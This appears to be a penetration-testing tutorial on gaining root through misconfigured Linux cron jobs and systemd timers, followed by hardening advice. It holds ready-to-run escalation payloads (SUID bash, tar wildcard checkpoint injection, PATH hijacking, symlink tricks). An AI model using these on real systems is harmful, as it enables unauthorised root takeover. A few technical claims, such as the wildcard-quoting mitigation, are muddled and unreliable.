## Cron Jobs for Privilege Escalation

Cron is the Linux task scheduler that runs commands and scripts at specified times. **Cron jobs running as root** are a prime privilege escalation vector when misconfigured, especially if the scripts or their parent directories are writable by lower-privileged users.

---

### 1. Understanding Cron

**What is Cron?**
- System daemon that executes scheduled tasks
- Runs with the privileges of the user who owns the crontab
- Root-owned cron jobs run with **full root privileges**
- Typically runs scripts for backups, log rotation, system maintenance, etc.

**Cron File Locations**:
| Location | Description |
|----------|-------------|
| `/etc/crontab` | System-wide crontab (specifies user to run as) |
| `/etc/cron.d/` | System-wide cron files |
| `/etc/cron.hourly/` | Scripts run every hour |
| `/etc/cron.daily/` | Scripts run daily |
| `/etc/cron.weekly/` | Scripts run weekly |
| `/etc/cron.monthly/` | Scripts run monthly |
| `/var/spool/cron/crontabs/` | User-specific crontabs (Debian/Ubuntu) |
| `/var/spool/cron/` | User-specific crontabs (RHEL/CentOS) |
| `/etc/cron.allow` | Users allowed to use cron (if exists) |
| `/etc/cron.deny` | Users denied from using cron |

---

### 2. Enumeration: Finding Cron Jobs

**List all cron jobs for current user**:
```bash
crontab -l
```

**List root's cron jobs**:
```bash
sudo crontab -l
```

**Find all cron files**:
```bash
# System crontabs
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/* 2>/dev/null

# User crontabs
ls -la /var/spool/cron/crontabs/ 2>/dev/null
ls -la /var/spool/cron/ 2>/dev/null

# Directory scripts
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
```

**Check for cron scripts in other locations**:
```bash
# Look for scripts that might be called by cron
find / -name "*.sh" -exec grep -l "cron\|daily\|weekly\|hourly" {} \; 2>/dev/null

# Check for custom cron directories
find /etc -name "*cron*" -type d 2>/dev/null
```

**Monitor running cron jobs**:
```bash
# View cron logs
tail -f /var/log/syslog | grep CRON
tail -f /var/log/cron
journalctl -u cron -f

# See what's currently running
ps aux | grep cron
```

---

### 3. Exploitation Vectors

#### A. Writable Cron Scripts (Most Common)

If a cron job executes a script that is **writable** by a lower-privileged user, that user can modify the script to execute arbitrary commands as root.

**Example Scenario**:
- Root cron runs: `/usr/local/bin/backup.sh` every hour
- Script is world-writable: `-rwxrwxrwx 1 root root`
- Attacker modifies the script:
  ```bash
  echo '#!/bin/bash
  chmod +s /bin/bash
  echo "hacked" > /tmp/flag' > /usr/local/bin/backup.sh
  ```
- When cron runs, `/bin/bash` becomes SUID root

**Complete Exploit Workflow**:
```bash
# 1. Find writable cron scripts
find /etc/cron* /var/spool/cron -type f -writable 2>/dev/null
find / -path /proc -prune -o -type f -name "*.sh" -writable -exec ls -la {} \; 2>/dev/null

# 2. Identify if it's executed by root
cat /etc/crontab | grep writable_script

# 3. Inject payload
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' >> /path/to/writable/script.sh

# 4. Wait for cron to execute (or trigger manually if possible)
/tmp/rootbash -p  # Get root shell
```

---

#### B. Writable Cron Directories

If a cron directory (like `/etc/cron.daily/`) is writable, an attacker can add a new script.

**Exploitation**:
```bash
# Check directory permissions
ls -ld /etc/cron.daily/
# Output: drwxrwxrwx 2 root root

# Create malicious script
echo '#!/bin/bash
chmod +s /bin/bash' > /etc/cron.daily/exploit.sh
chmod +x /etc/cron.daily/exploit.sh

# Wait for execution
```

**Note**: The script must be executable (`chmod +x`) and typically needs to have no extension restrictions (depends on system configuration).

---

#### C. PATH Hijacking in Cron

If a cron script uses a command **without an absolute path** (e.g., `backup` instead of `/usr/local/bin/backup`), cron's PATH can be exploited.

**Exploitation**:
```bash
# 1. Check cron's PATH (in /etc/crontab)
cat /etc/crontab
# Output: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 2. Find a cron script that calls commands without full path
cat /etc/cron.daily/logrotate
# Output: compress_logs  # No absolute path

# 3. Create a malicious binary in a PATH directory that's writable
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /usr/local/bin/compress_logs
chmod +x /usr/local/bin/compress_logs

# 4. Wait for cron to run
```

**Alternative**: If a writable directory is **earlier** in PATH than the legitimate binary location, hijacking is possible:
```bash
# Add /tmp to front of PATH for cron (if cron uses system PATH)
export PATH=/tmp:$PATH  # Doesn't work for cron normally
```

**Cron-specific PATH**: If using `/etc/crontab`, PATH is defined there. If using user crontabs, PATH is defined in the user's environment.

---

#### D. Wildcard Injection in Cron Scripts

When a cron script uses wildcards (`*`) in commands like `tar`, `chown`, or `rm`, an attacker can create files with special filenames that execute arbitrary commands.

**Classic Example - Tar Wildcard Exploit**:
```bash
# Cron job doing: tar -czf /backup/backup.tgz /var/www/*
# Attacker in /var/www/:
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh exploit.sh'
echo '#!/bin/bash
chmod +s /bin/bash' > exploit.sh
chmod +x exploit.sh

# When cron runs tar, the wildcard expands to:
tar -czf /backup/backup.tgz /var/www/--checkpoint=1 --checkpoint-action=exec=sh\ exploit.sh
# Tar executes exploit.sh as root
```

**Other Dangerous Commands with Wildcards**:
- `rm -rf /path/*` → Create `--no-preserve-root` to delete everything
- `chown -R user:group /path/*` → Create `--reference=somefile` to change ownership
- `cp -r /path/* /dest/` → Create `--preserve=all` options

**Mitigation**: Always quote wildcards: `"$@"` instead of `$@`, or use `--` to end options: `tar -czf /backup/backup.tgz -- /var/www/*`

---

#### E. Symbolic Link Attacks (TOCTOU)

Time of Check to Time of Use (TOCTOU) vulnerability where a cron script checks a file's permissions, then uses it, but the file is swapped in between.

**Example**: If a cron script does:
```bash
if [ -w /tmp/data ]; then
    cat /tmp/data >> /var/log/secure.log
fi
```

**Exploitation**:
```bash
# Create a symlink to /etc/shadow
ln -s /etc/shadow /tmp/data

# Wait for cron to check (will pass if data is writable? No, check fails)
# Better: Create a file /tmp/data, then in the race window, replace with symlink
```

**More dangerous**: If cron uses `chown` or `chmod` recursively:
```bash
# Cron does: chown -R root:root /tmp/process_data/
# Attacker creates symlink in /tmp/process_data/ pointing to /etc/passwd
# When cron runs, it changes ownership of /etc/passwd to root:root (already root, but could be other targets)
```

---

#### F. Anacron Jobs

Anacron runs jobs that might be missed if system is off. Similar vulnerabilities apply.

**Locations**:
- `/etc/anacrontab`
- `/var/spool/anacron/`

---

#### G. Systemd Timers (Modern Cron)

Modern systems often use systemd timers instead of cron. These can also be exploited.

**Enumerate**:
```bash
# List all timers
systemctl list-timers --all

# Check timer details
systemctl status <timer>.timer

# Find writable service files
find /etc/systemd/system/ -name "*.service" -writable 2>/dev/null
```

**Exploitation**: If a timer's service file is writable, modify it to execute commands:
```bash
# Edit service file
vim /etc/systemd/system/backup.service
# Add: ExecStart=/bin/bash -c 'chmod +s /bin/bash'

# Reload and restart
systemctl daemon-reload
systemctl restart backup.service
```

---

### 4. Automated Exploitation

**Tools to identify cron misconfigurations**:
```bash
# LinPEAS cron checks
./linpeas.sh | grep -A 10 "Cron Jobs"

# LinEnum
./linenum.sh | grep -i cron

# Custom quick check
for cron_file in /etc/crontab /etc/cron.d/* /var/spool/cron/* /var/spool/cron/crontabs/*; do
    [ -f "$cron_file" ] && echo "=== $cron_file ===" && cat "$cron_file"
done
```

---

### 5. Advanced Techniques

#### A. Script Dependencies

If a cron script includes or sources other files:
```bash
# Cron script does: source /etc/config/backup.conf
# Attacker writes to /etc/config/backup.conf (if writable)
echo 'chmod +s /bin/bash' >> /etc/config/backup.conf
```

#### B. Command Injection in Variables

If cron script uses user-controlled input:
```bash
# Cron script: zip -r backup.zip $(cat /tmp/filelist.txt)
# Attacker writes to /tmp/filelist.txt:
; chmod +s /bin/bash;
```

---

### 6. Defensive Measures

**For System Administrators**:

1. **Proper Permissions**:
   ```bash
   # Restrict cron directories
   chmod 755 /etc/cron.daily/
   chmod 644 /etc/crontab
   chown root:root /etc/crontab
   
   # Make cron scripts non-writable
   chmod 755 /usr/local/bin/backup.sh
   chown root:root /usr/local/bin/backup.sh
   ```

2. **Use Absolute Paths**:
   ```bash
   # Bad
   * * * * * root backup_script
   
   # Good
   * * * * * root /usr/local/bin/backup_script
   ```

3. **Avoid Wildcards in Destructive Commands**:
   ```bash
   # Bad
   tar -czf backup.tgz /var/www/*
   
   # Better
   tar -czf backup.tgz /var/www --  # Still risky
   
   # Best
   tar -czf backup.tgz /var/www/html /var/www/images
   ```

4. **Use `--` to End Options**:
   ```bash
   tar -czf backup.tgz -- /var/www/*  # Ignores filenames starting with -
   ```

5. **Separate Cron Directories**:
   ```bash
   # Use separate directory for cron scripts
   mkdir /opt/cron_scripts/
   chown root:root /opt/cron_scripts/
   chmod 750 /opt/cron_scripts/
   ```

6. **Monitor and Alert**:
   ```bash
   # Audit cron changes
   auditctl -w /etc/crontab -p wa -k cron_change
   auditctl -w /etc/cron.d/ -p wa -k cron_change
   
   # Email alerts on changes
   # Use AIDE/Tripwire for integrity checking
   ```

7. **Restrict Cron Access**:
   ```bash
   # Allow only specific users
   echo "root" > /etc/cron.allow
   echo "admin" >> /etc/cron.allow
   ```

